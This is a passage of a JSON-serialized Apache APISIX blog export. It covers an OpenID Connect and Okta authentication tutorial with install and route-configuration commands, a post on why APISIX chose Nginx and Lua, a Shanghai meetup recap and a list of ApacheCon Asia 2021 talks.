ID: OAuth client ID, which is the ID of the application, corresponding to `client_id` and `{YOUR_CLIENT_ID}` below.\\n- Client secret: OAuth client secret, i.e. application key, corresponds to `client_secret` and `{YOUR_CLIENT_SECRET}` below.\\n- Okta domain: The domain name used by the application, corresponds to `{YOUR_ISSUER}` in discovery below.\\n\\n![Get configuration info](https://static.apiseven.com/202108/1639467501106-d95bf8ad-db47-4918-ac70-424b12488e5b.png)\\n\\n### Installing Apache APISIX\\n\\nYou can install Apache APISIX in a variety of ways such as through source packages, Docker, Helm Chart, etc.\\n\\n#### Installing dependencies\\n\\nThe Apache APISIX runtime environment requires dependencies on NGINX and etcd, so before installing Apache APISIX, please install the corresponding dependencies according to the operating system you are using. We have provided steps for installing dependencies on CentOS7, Fedora 31 & 32, Ubuntu 16.04 & 18.04, Debian 9 & 10 and MacOS, please refer to [Installing dependencies](https://apisix.apache.org/zh/docs/apisix/install) for details. -dependencies/).\\n\\nWhen installing Apache APISIX via Docker or Helm Chart, the required NGINX and etcd are already included, please refer to the respective documentation.\\n\\n#### Installation via RPM package (CentOS 7)\\n\\nThis installation method is available for CentOS 7 operating system, please run the following command to install Apache APISIX.\\n\\n```shell\\nsudo yum install -y https://github.com/apache/apisix/releases/download/2.7/apisix-2.7-0.x86_64.rpm\\n```\\n\\n#### Installation via Docker\\n\\nFor details, please refer to: [Installing Apache APISIX with Docker](https://hub.docker.com/r/apache/apisix).\\n\\n#### Installation via Helm Chart\\n\\nFor details, please refer to: [Installing Apache APISIX with Helm Chart](https://github.com/apache/apisix-helm-chart).\\n\\n#### Installation via source package\\n\\n1. Create a directory named ``apisix-2.7``.\\n  \\n  ```shell\\n  mkdir apisix-2.7\\n  ```\\n\\n2. Download the Apache APISIX Release source package.\\n  \\n  ```shell\\n  wget https://downloads.apache.org/apisix/2.7/apache-apisix-2.7-src.tgz\\n  ```\\n\\n  You can also download the Apache APISIX Release source package from the Apache APISIX official website. The Apache APISIX official website also provides source packages for Apache APISIX, APISIX Dashboard, and APISIX Ingress Controller, see [Apache APISIX official website - download page](https://apisix.apache.org/zh/ For details, please refer to the [Apache APISIX official-downloads page](https://apisix.apache.org/downloads).\\n\\n3. Unpack the Apache APISIX Release source package.\\n  \\n  ```shell\\n  tar zxvf apache-apisix-2.7-src.tgz -C apisix-2.7\\n  ```\\n\\n4. install the runtime dependencies of the Lua library:\\n\\n  ```shell\\n  # Switch to the apisix-2.7 directory\\n  cd apisix-2.7\\n  # Create dependencies\\n  make deps\\n  ```\\n\\n#### Initializing dependencies\\n\\nRun the following command to initialize the NGINX configuration file and etcd.\\n\\n```shell\\n# initialize NGINX config file and etcd\\nmake init\\n```\\n\\n### Start Apache APISIX and configure the corresponding routes\\n\\n1. Run the following command to start Apache APISIX. 2.\\n\\n2. Create routes and configure the OpenID Connect plug-in.\\n\\nThe OpenID Connect configuration list is as follows.\\n\\n|fields|default|description|\\n| :------| :------------ | :------- |\\n|client_id|\\"\\"|OAuth client ID|\\n|client_secret|\\"\\"|OAuth client key|\\n|discovery|\\"\\"|the identity provider\'s service discovery endpoint|\\n|scope|openid|scope of resources to be accessed|\\n|relm|apisix|specifies the WWW-Authenticate response header authentication information|\\n|bearer_only|false|whether to check the token in the request header|\\n|logout_path|/logout|logout URI|\\n|redirect_uri|request_uri|The URI that the identity provider jumped back to, defaulting to the request address|\\n|timeout|3|The request timeout in seconds|\\n|ssl_verify|false|whether the identity provider verifies the ssl certificate|\\n|introspection_endpoint|\\"\\"|the URL of the identity provider\'s token verification endpoint, which will be extracted from the discovery response if not filled|\\n|introspection_endpoint_auth_method|client_secret_basic|the name of the token\'s default authentication method|\\n|public_key|\\"\\"|public key of the authentication token|\\n|token_signing_alg_values_expected|\\"\\"|the algorithm for authenticating tokens|\\n|set_access_token_header|true|whether to carry the access token in the request header|\\n|access_token_in_authorization_header|false|Place the access token in the Authorization header if true, or in the X-Access-Token header if false|\\n|set_id_token_header|true|whether to carry the ID token in the X-ID-Token request header|\\n|set_userinfo_header|true|whether to carry user information in the X-Userinfo request header|\\n\\nThe following code example creates a route through the Apache APISIX Admin API, setting the route upstream to httpbin.org. httpbin.org is a simple backend service for receiving and responding to requests, and the get page of httpbin.org is used below, see [http bin get]( http://httpbin.org/#/HTTP_Methods/get_get).\\n\\nPlease refer to [Apache APISIX OpenID Connect Plugin](https://apisix.apache.org/zh/docs/apisix/plugins/openid-connect/) for specific configuration items.\\n\\n```shell\\ncurl -XPOST 127.0.0.1:9080/apisix/admin/routes -H \\"X-Api-Key: edd1c9f034335f136f87ad84b625c8f1\\" -d \'{\\n    \\"uri\\":\\"/*\\",\\n    \\"plugins\\":{\\n        \\"openid-connect\\":{\\n            \\"client_id\\":\\"{YOUR_CLIENT_ID}\\",\\n            \\"client_secret\\":\\"{YOUR_CLIENT_SECRET}\\",\\n            \\"discovery\\":\\"https://{YOUR_ISSUER}/.well-known/openid-configuration\\",\\n            \\"scope\\":\\"openid profile\\",\\n            \\"bearer_only\\":false,\\n            \\"realm\\":\\"master\\",\\n            \\"introspection_endpoint_auth_method\\":\\"client_secret_post\\",\\n            \\"redirect_uri\\": \\"http://127.0.0.1:9080/\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Step 4: Accessing Apache APISIX\\n\\n1. Visit http://127.0.0.1:9080/get and the page is redirected to the Okta login page because the OpenID Connect plugin is turned on.\\n  \\n![visit Okta login page](https://static.apiseven.com/202108/1639467566395-2a049b96-3b1f-4e74-93f0-d6ea2f52a72e.png)\\n  \\n2. Enter the password you registered with Okta and click \\"Sign in\\" to log in to your Okta account. 3.\\n\\n3. After successful login, you can successfully access the get page in httpbin.org. The httpbin.org/get page will return the requested data as follows.\\n\\n  ```sh\\n  \\"X-Access-Token\\": \\"******Y0RPcXRtc0FtWWVuX2JQaFo1ZVBvSlBNdlFHejN1dXY5elV3IiwiYWxnIjoiUlMyNTYifQ.***TVER3QUlPbWZYSVRzWHRxRWh2QUtQMWRzVDVGZHZnZzAiLCJpc3MiOiJodHRwczovL3FxdGVzdG1hbi5va3RhLmNvbSIsImF1ZCI6Imh0dHBzOi8vcXF0ZXN0bWFuLm9rdGEuY29tIiwic3ViIjoiMjgzMDE4Nzk5QHFxLmNvbSIsImlhdCI6MTYyODEyNjIyNSwiZXhwIjoxNjI4MTI5ODI1LCJjaWQiOiIwb2ExMWc4ZDg3TzBGQ0dYZzY5NiIsInVpZCI6IjAwdWEwNWVjZEZmV0tMS3VvNjk1Iiwic2NwIjpbIm9wZW5pZCIsInByb2Zpb***.****iBshIcJhy8QNvzAFD0fV4gh7OAdTXFMu5k0hk0JeIU6Tfg_Mh-josfap38nxRN5hSWAvWSk8VNxokWTf1qlaRbypJrKI4ntadl1PrvG-HgUSFD0JpyqSQcv10TzVeSgBfOVD-czprG2Azhck-SvcjCNDV-qc3P9KoPQz0SRFX0wuAHWUbj1FRBq79YnoJfjkJKUHz3uu7qpTK89mxco8iyuIwB8fAxPMoXjIuU6-6Bw8kfZ4S2FFg3GeFtN-vE9bE5vFbP-JFQuwFLZNgqI0XO2S7l7Moa4mWm51r2fmV7p7rdpoNXYNerXOeZIYysQwe2_L****\\",\\n  \\"X-Id-Token\\": \\"******aTdDRDJnczF5RnlXMUtPZUtuSUpQdyIsImFtciI6WyJwd2QiXSwic3ViIjoiMDB1YTA1ZWNkRmZXS0xLdW82OTUiLCJpc3MiOiJodHRwczpcL1wvcXF0ZXN0bWFuLm9rdGEuY29tIiwiYXVkIjoiMG9hMTFnOGQ4N08wRkNHWGc2OTYiLCJuYW1lIjoiUGV0ZXIgWmh1IiwianRpIjoiSUQuNGdvZWo4OGUyX2RuWUI1VmFMeUt2djNTdVJTQWhGNS0tM2l3Z0p5TTcxTSIsInZlciI6MSwicHJlZmVycmVkX3VzZXJuYW1lIjoiMjgzMDE4Nzk5QHFxLmNvbSIsImV4cCI6MTYyODEyOTgyNSwiaWRwIjoiMDBvYTA1OTFndHAzMDhFbm02OTUiLCJub25jZSI6ImY3MjhkZDMxMWRjNGY3MTI4YzlmNjViOGYzYjJkMDgyIiwiaWF0IjoxNjI4MTI2MjI1LCJhdXRoX3RpbWUi*****\\",\\n  \\"X-Userinfo\\": \\"*****lfbmFtZSI6IlpodSIsImxvY2FsZSI6ImVuLVVTIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiMjgzMDE4Nzk5QHFxLmNvbSIsInVwZGF0ZWRfYXQiOjE2MjgwNzA1ODEsInpvbmVpbmZvIjoiQW1lcmljYVwvTG9zX0FuZ2VsZXMiLCJzdWIiOiIwMHVhMDVlY2RGZldLTEt1bzY5NSIsImdpdmVuX25hbWUiOiJQZXRlciIsIm5hbWUiOiJQZXRl****\\"\\n  ```\\n\\nIn which:\\n\\n**X-Access-Token**: Apache APISIX puts the access token obtained from the user provider into the X-Access-Token request header, which can be optionally put into the Authorization request header via access_token_in_authorization_header in the plugin configuration.\\n\\n![X-Access-Token](https://static.apiseven.com/202108/1639467626264-980605e2-0b21-4512-9e2c-af71950fcf99.png)\\n\\n**X-Id-Token**: Apache APISIX will put the ID token obtained from the user provider into the X-Id-Token request header after base64 encoding, you can choose whether to enable this feature by using the set_id_token_header in the plugin configuration.\\n\\n![X-Id-Token](https://static.apiseven.com/202108/1639467682902-ada726b8-b46b-460d-8313-ef47b38d13ab.png)\\n\\n**X-Userinfo**: Apache APISIX will get the user information from the user provider and put it into X-Userinfo after base64 encoding, you can choose whether to turn it on or not by using set_userinfo_header in the plugin configuration, the default is on.\\n\\n![X-Userinfo](https://static.apiseven.com/202108/1639467730566-fc8a8a76-a3aa-4b8e-bb13-505b50839877.png)\\n\\nAs you can see, Apache APISIX will carry the X-Access-Token, X-Id-Token, and X-Userinfo request headers to the upstream. The upstream can parse these headers to get the user ID information and user metadata.\\n\\nWe show the process of setting up centralized authentication from Okta directly in Apache APISIX. It is easy to get started by signing up for a free Okta developer account. This centralized approach to authentication reduces learning and maintenance costs for developers and provides a secure and streamlined user experience.\\n\\n## About Okta\\n\\nOkta is a customizable, secure centralized authentication solution. Okta can add authentication and authorization to your application. Get scalable authentication directly in your application without writing your own code. You can connect your application to Okta and define how users log in. Each time a user tries to authenticate, Okta verifies their identity and sends the required information back to your application.\\n\\n## About Apache APISIX\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, and other rich traffic management features. You can use Apache APISIX for traditional north-south traffic, as well as east-west traffic between services, or as a [Kubernetes Ingress Controller](https://github.com/apache/apisix-ingress-controller).\\n\\nHundreds of enterprises worldwide have used Apache APISIX to handle business-critical traffic, covering finance, Internet, manufacturing, retail, carriers, and more, such as NASA, the EU\'s Digital Factory, China Airlines, China Mobile, Tencent, Huawei, Sina Weibo, NetEase, Ke, 360, Taikang, Nayuki, and more.\\n\\nGithub: https://github.com/apache/apisix\\n\\nOfficial website: https://apisix.apache.org"},{"id":"2021/08/25/why-apache-apisix-chose-nginx-and-lua","metadata":{"permalink":"/blog/2021/08/25/why-apache-apisix-chose-nginx-and-lua","source":"@site/blog/2021/08/25/Why-Apache-APISIX-chose-Nginx-and-Lua.md","title":"Why Apache APISIX chose Nginx and Lua to build API Gateway","description":"This article introduces the historical background of Apache APISIX\'s choice of Nginx + Lua technology stack and the advantages they bring to APISIX.","date":"2021-08-25T00:00:00.000Z","formattedDate":"August 25, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.925,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Centralized authentication using the OpenID Connect plugin for Apache APISIX","permalink":"/blog/2021/08/25/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication"},"nextItem":{"title":"Apache APISIX Meetup in Shanghai","permalink":"/blog/2021/08/24/shanghai-meetup-recap"}},"content":"> This article was written by Zexuan Luo, engineer of [API7.ai](https://api7.ai/), and introduced the historical background of Apache APISIX\'s selection of Nginx + Lua technology stack and the advantages this technology stack brings to Apache APISIX. Zexuan Luo is an OpenResty developer and Apache APISIX PMC.\\n\\n\x3c!--truncate--\x3e\\n\\nWhen I was at this year\u2019s COSCUP conference, some visitors asked me why did Apache APISIX, Kong, and 3scale API Gateways all choose Lua to build the program?\\n\\nYes, Lua is not a well-known language, and it is probably a long way from the most popular programming language.\\n\\nSo why do Apache APISIX and other well-known gateways choose Lua?\\n\\nThe technology stack used by Apache APISIX is not only Lua. To be precise, it should be Nginx with Lua. Apache APISIX is based on Nginx and uses Lua to build plugins or other features.\\n\\n## LuaJIT VS Go\\n\\nSerious readers may point out that Apache APISIX is not based on the Nginx + Lua stack, but Nginx + LuaJIT (also known as OpenResty). LuaJIT is a Just-In-Time Compiler (JIT) for the Lua programming language, its performance is much better than Lua. LuaJIT adds FFI functions to make it easy and efficient to call C code.\\n\\nSince the current popular API gateways are either based on OpenResty or Go, developers are having hot debates about the performances of Lua and Go.\\n\\n**From my point of view, it is meaningless to compare the performance of languages without scenes.**\\n\\nFirst of all, to be clear, Apache APISIX is based on Nginx and Lua, and only the outer layer codes use Lua. So if you want to know which gateway performs better, the correct comparison object is to compare C with LuaJIT and Go. The bulk of the performance of the gateway lies in proxy HTTP requests and responses, and Nginx mainly does this piece of work.\\n\\n**The best way to test gateways\u2019 performances is to compare the HTTP implementation of the Nginx and Go standard libraries.**\\n\\nAs we all know, Nginx is a high-performance server, which is very strict with memory usage. Here are two examples:\\n\\nThe request header in Nginx is usually just a pointer to the original HTTP request data, and a copy is created only when it is modified.\\n\\nWhen Nginx proxy upstream server\u2019s response, It is very complicated to reuse Buffer.\\n\\nWith those strict rules, Nginx is one of the most popular and high-performance servers.\\n\\nIn contrast, the HTTP implementation in Go standard library is typical of memory abuse. Fasthttp, a project that re-implements HTTP packages in the Go standard library, gives us two examples:\\n\\nWe cannot reuse the standard library\u2019s HTTP Request structure;\\nHeaders are always parsed in advance and stored as a `map [string][]string`, even if they are not used (see: [Fasthttp FAQ](https://github.com/valyala/fasthttp#faq)).\\n\\nThe Fasthttp document also mentions some optimization skills for bytes matter, I would suggest that you take a look.\\n\\nActually, codes written in LuaJIT are not necessarily much worse than those written in Go. Here are two reasons:\\n\\n**First, most of Lua\u2019s library cores are written in C.**\\n\\nFor example, lua-cjson and lua-resty-core are implemented with C, but the Go libraries, of course, are mainly implemented with Go. Although there is such a thing called CGO, it is limited by Go\'s coroutine scheduling and toolchain, and it can only be in a subordinate position in the Go ecosystem.\\n\\nFor the comparison of LuaJIT and Go\u2019s affinity with C, here has one post from Hacker News: [Comparing the C FFI overhead in various programming languages](https://news.ycombinator.com/item?id=17161168).\\n\\nSo when we compare some of Lua\u2019s features, we are actually comparing C and Go.\\nSecond, LuaJIT\u2019s JIT optimization is unparalleled.\\n\\n**Secondly, LuaJIT has one of the best JIT Opitimizations.**\\n\\nWe could divide dynamic languages into two cases, with or without JIT. JIT optimization can compile dynamic language code into machine code at runtime, thus improving the performance of the original code by order of magnitude.\\n\\nLanguages with JIT can also be divided into two cases, those that fully support JIT (e.g LuaJIT) and those that only support part of JIT.\\n\\nThe debate about who is faster, LuaJIT or V8, has been a hot topic for a long time. In short, the performance of LuaJIT is not much different from that of the pre-compiled Go program.\\n\\nAs for which one is slower and slower by how much, that is a matter of opinion. Here is an example:\\n\\n```Lua\\nlocal text = {\\"The\\", \\"quick\\", \\"brown\\", \\"fox\\", \\"jumped\\", \\"over\\", \\"the\\", \\"lazy\\", \\"dog\\", \\"at\\", \\"a\\", \\"restaurant\\", \\"near\\", \\"the\\", \\"lake\\", \\"of\\", \\"a\\", \\"new\\", \\"era\\"}\\nlocal map = {}\\nlocal times = 1e8\\nlocal n = #text\\nfor i = 1, n do\\n    map[text[i]] = 0\\n    for _ = 1, times do\\n        map[text[i]] = map[text[i]] + 1\\n    end\\nend\\n\\nfor i = 1, n do\\n    io.write(text[i], \\" \\", map[text[i]], \\"\\\\n\\")\\nend\\n```\\n\\n```Go\\npackage main\\nimport \\"fmt\\"\\nfunc main() {\\n    text := []string{\\"The\\", \\"quick\\", \\"brown\\", \\"fox\\", \\"jumped\\", \\"over\\", \\"the\\", \\"lazy\\", \\"dog\\", \\"at\\", \\"a\\", \\"restaurant\\", \\"near\\", \\"the\\", \\"lake\\", \\"of\\", \\"a\\", \\"new\\", \\"era\\"}\\n    m := map[string]int{}\\n    times := int(1e8)\\n    for _, t := range text {\\n        m[t] = 0\\n        for i := 0; i < times; i++ {\\n            m[t]++\\n        }\\n    }\\n    for _, t := range text {\\n        fmt.Println(t, \\" \\", m[t])\\n    }\\n}\\n```\\n\\nThe above two code snippets are equivalent. Can you guess whether the first Lua version is faster or the second Go version is shorter?\\n\\nThe first took less than 1 second on my machine, and the second took more than 23 seconds.\\n\\nThis example is not to prove that LuaJIT is 20 times faster than Go. I want to show that using a microbenchmark to prove that one language is shorter than another does not make much sense because many factors affect performance. A simple microbenchmark is likely to overemphasize one factor and lead to unexpected results.\\n\\n## Nginx with Lua: High Performance + Flexibility\\n\\nLet\u2019s go back to Apache APISIX\u2019s Nginx and Lua stack. The Nginx + Lua stack brings us more than just high performance.\\n\\nPeople often ask us, since Apache APISIX is based on the open-sourced Nginx, and Nginx does not support dynamic configuration, why Apache APISIX claims that it supports dynamic configuration? Has it changed anything?\\n\\nYes, we do maintain our own Nginx distribution, but most features of Apache APISIX are available on the official Nginx. The reason why we can do dynamic configuration is to put the configuration into Lua code.\\n\\nTake the Route system as an example. Nginx\u2019s routes need to be configured in the configuration file, and every time the route is changed, it needs to be reloaded before it can take effect. Nginx\u2019s route distribution only supports static configuration and cannot dynamically increase or decrease routes.\\n\\n**To support dynamic routing configuration, Apache APISIX does two things:**\\n\\n1. Configure a single server in the Nginx configuration file. There is only one location on this server. We use this location as the main entrance so that all requests will come to this place.\\n\\n1. We use Lua to complete the route distribution work. Apache APISIX\u2019s route distribution module supports increasing or decreasing routes at run time to configure routes dynamically.\\n\\nYou may want to ask, is routing distribution in Lua slower than Nginx implementation?\\n\\nAs mentioned earlier, we rewrite the core code in C for those with high-performance requirements. We did the same thing our route distribution module does. The module uses a radix-tree to match a route. We use C to implement the radix-tree. Please feel free to take a look at the code in [lua-resty-radixtree](https://github.com/api7/lua-resty-radixtree/).\\n\\nAfter completing the radix-tree matching, it is time for Lua to show its flexibility. We support matching at the next level in many other ways for each the same prefix route, including checking through a specific expression. Although it is tough to access an expression engine using C, a pure C implementation cannot flexibly customize the variables inside the expression.\\n\\nFor example, here is the route configuration that Apache APISIX uses to match GraphQL requests:\\n\\n```json\\n{\\n        \\"methods\\": [\\"POST\\"],\\n        \\"upstream\\": {\\n            \\"nodes\\": {\\n                \\"127.0.0.1:1980\\": 1\\n            },\\n            \\"type\\": \\"roundrobin\\"\\n        },\\n        \\"uri\\": \\"/hello\\",\\n        \\"vars\\": [[\\"graphql_name\\", \\"==\\", \\"repo\\"]]\\n}\\n```\\n\\nIt matches a GraphQL request like this:\\n\\n```SQL\\nquery repo {\\n    owner {\\n        name\\n    }\\n}\\n```\\n\\nThe graphql_name here is not an Nginx built-in variable, but is defined through Lua code. Apache APISIX defines three GraphQL-related variables, and there are only 62 lines of Lua codes (including parsing the GraphQL body). If you want to define variables through the Nginx C module, 62 lines may just be building up the boilerplate code of related methods, and there is no real logic to parse GraphQL yet.\\n\\n**Using Lua for routing has another advantage: it reduces the threshold of development.**\\n\\nSuppose we need particular logic in the routing process, users can implement custom variables and operators, such as determining which route to use by matching the geographic location of the IP library. Users only need to write some Lua code, which is much less complicated than modifying the Nginx C module.\\n\\nIn Apache APISIX, the routing system is dynamic. Our TLS server-side certificates and upstream node configurations are dynamic. There is no need to modify Nginx \u2014 the above functions can run on the official Nginx and Lua stack. Of course, by modifying Nginx, we have also implemented more advanced features, such as dynamic gzip configuration and dynamic client request size limit. We will implement our own Nginx distribution later so that open source users can easily use these advanced functions."},{"id":"Apache APISIX Meetup in Shanghai","metadata":{"permalink":"/blog/2021/08/24/shanghai-meetup-recap","source":"@site/blog/2021/08/24/shanghai-meetup-recap.md","title":"Apache APISIX Meetup in Shanghai","description":"This Apache APISIX Meetup (Shanghai) shared topics related to iQIYI\'s application practice, centralized identity authentication, and data sovereignty.","date":"2021-08-24T00:00:00.000Z","formattedDate":"August 24, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.78,"truncated":true,"authors":[{"name":"Apache APISIX"}],"prevItem":{"title":"Why Apache APISIX chose Nginx and Lua to build API Gateway","permalink":"/blog/2021/08/25/why-apache-apisix-chose-nginx-and-lua"},"nextItem":{"title":"ApacheCon Asia 2021","permalink":"/blog/2021/08/23/apachecon-asia-2021"}},"content":"> Event review: Apache APISIX Meetup Shanghai topic sharing and video review.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX Meetup Shanghai was successfully held last Saturday (August 21st) \ud83c\udf89\ud83c\udf89\ud83c\udf89\ud83c\udf89\\n\\nThe Meetup was initiated by [API7.AI](https://www.apiseven.com/zh), and invited partners such as iQiyi, AirWallex, and other partners to come together with Apache APISIX technical experts, Apache APISIX PMC members, and community technical experts to discuss about The conference was a great opportunity to discuss Apache APISIX community development, industry practices and other topics.\\n\\nLet\'s take a look back at some of the most memorable talks from the conference!\\n\\n## Apache APISIX-based iQiYi API Gateway Implementation Practice\\n\\n**Instructor**: Cong He\\n\\n**Personal Introduction**: Senior R&D Engineer, IIG Infrastructure Department - Compute Cloud, mainly responsible for iQiYi Gateway development and operation and maintenance.\\n\\n**Detail of Topic**: API gateway has become an indispensable part of the microservice architecture. It bears the sole gateway for services to the outside world, but also needs to meet the common functions of many applications. As an online video company, iQiYi has to carry tens of millions of calls every day, and has extremely strict requirements for data security, user request response time, and system stability, so the company needs to build a high-performance, highly available API gateway. This sharing briefly introduces the architecture of iQiYi API gateway and the functions implemented, including request distribution, conditional routing, Api management, flow restriction and fusion, security triple prevention, monitoring and alarming, and full link tracking.\\n\\n**Video Review**: [Akiyoshi\'s Apache APISIX-based API Gateway Implementation Practice](https://www.bilibili.com/video/BV1Qq4y1M7bK)\\n\\n## How to use Apache APISIX for centralized authentication\\n\\n**Instructor**: Xinxin Zhu\\n\\n**Personal Introduction**: API7 Engineer, Apache APISIX Committer\\n\\n**Detail of Topic**: Authentication is a very important part of zero-trust architecture. Authentication can effectively protect services from unauthorized malicious access, data leakage, and hacker attacks. APISIX, as a dynamic, real-time, high-performance API gateway, supports rich authentication plugins, and this sharing will introduce the benefits of centralized authentication and how to perform centralized authentication on APISIX.\\n\\n**Video Review**: [Using API Gateway APISIX for Centralized Authentication](https://www.bilibili.com/video/BV1WA411c7pa)\\n\\n## Data Sovereignty and Apache APISIX Gateway Landing Practices\\n\\n**Instructor**: Yang Li\\n\\n**Personal Introduction**: Head of AirWallex Technology Platform\\n\\n**Detail of Topic**: Data is everywhere, and massive amounts of data are processed, transmitted, and stored all over the world every moment. However, the world of data is not a place outside the law, the collection and processing of data must comply with the laws of each country. The API gateway has a special position in the enterprise architecture and therefore plays a special role in the data sovereignty scenario.\\n\\n**Video Review**: [Apache APISIX and Data Sovereignty in Practice](https://www.bilibili.com/video/BV1GL4y1Y7sR)\\n\\n## The one who travels alone travels fast, the one who travels with many travels far, Apache APISIX is grateful to have you\\n\\n**Instructor**: Yuansheng Wang\\n\\n**Personal Introduction**: Co-founder & CTO of API7.AI\\n\\n**Details**: Apache APISIX has been growing as a community since the first day of open source, and has quickly become the most active API gateway project in the world by winning the first place in many technical indicators in just two years, and defining the path that belongs exclusively to Apache APISIX: unified 7-layer traffic processing. One person may go fast, a group of people can go farther, Apache APISIX growth road thanks to you.\\n\\n**Video Review**: [The One Who Walks Alone Goes Fast, The Many Who Walk Far, Apache APISIX Thanks to You](https://www.bilibili.com/video/BV1Hh411q7eB)"},{"id":"2021/08/23/apachecon-asia-2021","metadata":{"permalink":"/blog/2021/08/23/apachecon-asia-2021","source":"@site/blog/2021/08/23/ApacheCon-Asia-2021.md","title":"ApacheCon Asia 2021","description":"ApacheCon Asia 2021 takes place online from August 6-8. The Apache APISIX community has submitted related topics such as rate limit, authentication, service mesh, etc.","date":"2021-08-23T00:00:00.000Z","formattedDate":"August 23, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":5.12,"truncated":true,"authors":[],"prevItem":{"title":"Apache APISIX Meetup in Shanghai","permalink":"/blog/2021/08/24/shanghai-meetup-recap"},"nextItem":{"title":"Apache APISIX Meetup in Shanghai, welcome to register!","permalink":"/blog/2021/08/21/shanghai-meetup"}},"content":"> ApacheCon is the official global conference series of the Apache Software Foundation. Since 1998, ApacheCon has been attracting participants at all levels to explore the \\"technologies of tomorrow\\" in more than 350 Apache projects and their diverse communities. ApacheCon Asia is an online ApacheCon conference with the primary goal of better serving the rapidly growing number of Apache users and contributors in the Asia-Pacific region. ApacheCon Asia 2021 takes place online August 6-8, 2021.\\n\\n\x3c!--truncate--\x3e\\n\\nThe Apache APISIX community actively participated in this annual open source event, presenting a rich set of 8 API/microservices technology-related topics.\\n\\n## Implementing Flow Limiting with Apache APISIX\\n\\nShared by: Junxu Chen\\n\\nNginx is often the first thing that comes to mind when it comes to limiting speed. However, Nginx is implemented through a configuration file, which requires reloading every time you make a change, making it extremely cumbersome to run and maintain. On the other hand, speed limiting conditions are limited to Nginx variables, making it difficult to achieve fine-grained speed limiting for business purposes. This session will show how to use Apache APISIX to achieve dynamic, fine-grained, and distributed rate-limiting, and how to use plug-in orchestration to achieve rate-limiting that better meets business needs.\\n\\n[**View**](/articles/Speed-Limiting-With-Apache-APISIX)\\n\\n## Testing Apache APISIX resilience with Chaos Mesh\\n\\nShared by: Shuyang Wu\\n\\nApache APISIX is one of the leading API gateways OSS. To make sure everything is going as planned, APISIX uses different kinds of tests, including unit, e2e, and fuzzy tests. However, we are still not sure how APISIX will behave when some abnormal but unavoidable circumstances occur, such as network failure, IO stress or Pods failure. So here we use Chaos Mesh, a Kubernetes-based chaos engineering platform that can smoothly inject different kinds of chaos and integrate them into our CI pipeline. At the end of this talk, the audience will learn where Chaos Engineering will benefit the API gateway and how to integrate Chaos Mesh into your own test pipeline.\\n\\n[**View**](/articles/Test-Apache-APISIX-Resilience-With-Chaos-Mesh)\\n\\n## Authentication and authorization with Apache APISIX\\n\\nShared by: Xinxin Zhu\\n\\nAuthentication and authorization are very essential features in API gateways. This way, services located behind the gateway are protected from unauthorized or malicious access, data leakage, and hacking. Apache APISIX is a dynamic, real-time, high-performance API gateway. And it offers a number of plug-ins, including authentication and authorization like key-auth, Open-ID, wolf-RBAC, etc. This proposal describes how to use APISIX for authentication and authorization.\\n\\n[**View**](/articles/Using-Apache-APISIX-To-Do-Authentication-and-Authorization)\\n\\n## Relying on the community to let Apache APISIX grow fast\\n\\nShared by: Yuansheng Wang\\n\\nIn the past year, APISIX has become the most active API gateway project in the world, not only because of its advanced technology, but also because of the highly active community. As of today, there are 225 contributors from all over the world, and the number is still growing rapidly. This session will introduce APISIX\'s experience in practicing \\"community over code\\". As an idealistic startup, how to combine with Apache culture to make the startup grow fast.\\n\\n[**View**](/articles/Relying-On-The-Community-To-Get-Apache-APISIX-Up-Speed)\\n\\n## Apache APISIX from open source project to the road to commercialization\\n\\nShared by: Ming Wen\\n\\nMing Wen, Founder of api7.ai, Chairman of Apache APISIX PMC, and member of Apache Foundation, will speak on \\"Apache APISIX from Open Source to Commercialization\\".\\n\\n[**View**](/articles/Apache-APISIX-From-OpenSource-Commercialization)\\n\\n## Using Echarts to render renderings of community events\\n\\nShared by: Yi Sun\\n\\nThe open source repository was analyzed by 1. contributor growth curve; 2. monthly contributor activity; 3. to reflect the health of the open source project, here we share some experiences and some interesting things about how to make these two graphs.\\n\\n[**View**](/articles/Rendering-Community-Events-Using-ECharts)\\n\\n## Running an open source commercialization company according to the Apache Way, does it work\\n\\nShared by: Ming Wen\\n\\nThe Apache Way is a proven community success for countless open source projects, so does the Apache Way work for open source commercial companies? Does it work in the business world? Through 2 years of operating as an open source commercial company, Tributary Technologies hopes to answer this question with the company\'s personal experience.\\n\\n[**View**](/articles/Apache-APISIX-From-OpenSource-Commercialization-by-Apache-Way)\\n\\n## The appeal of open source\\n\\nShared by: Ju Zhiyuan\\n\\nThe Apache Software Foundation\'s top project, Apache APISIX, and its subprojects have merged 250+ PRs in the last 30 days, and the contributor trend is very positive. In addition, the high quality mailing list, active QQ groups and GitHub are attracting a lot of community attention. As the Apache APISIX PMC, what are some of the things Apache APISIX has done to catalyze an active community from my perspective?\\n\\n[**View**](/articles/The-Appeal-of-OpenSource)\\n\\n## Apache APISIX Application and Practice in Mobile Cloud Object Storage EOS\\n\\nShared by: Yanshan Chen\\n\\nThis talk is about the application and practice of Apache APISIX in China Mobile\'s public cloud object storage EOS. Firstly, we introduced China Mobile\'s public cloud construction plan and the evolution of object storage products, then we explained why we chose Apache APISIX as the load balancing gateway, and introduced the three phases of EOS traffic management architecture evolution in detail. At the same time, we also share what practical production problems we have solved based on Apache APISIX, what solutions and development work we have done, and finally, we explain some of our future evolution plans.\\n\\n[**View**](/articles/Apache-APISIX-in-China-Mobile-Cloud)\\n\\n## How to extend Apache APISIX as a service grid side car\\n\\nShared by: Chao Zhang\\n\\nIn this topic, I will introduce the apisix-mesh-agent project, which has some capabilities to extend Apache APISIX as a sidecar program in a service grid scenario, and more importantly, it uses the xDS protocol to get configuration from control planes like Istio, Kuma, etc. After that, I will present future plans and expectations regarding the use of Apache APISIX in service 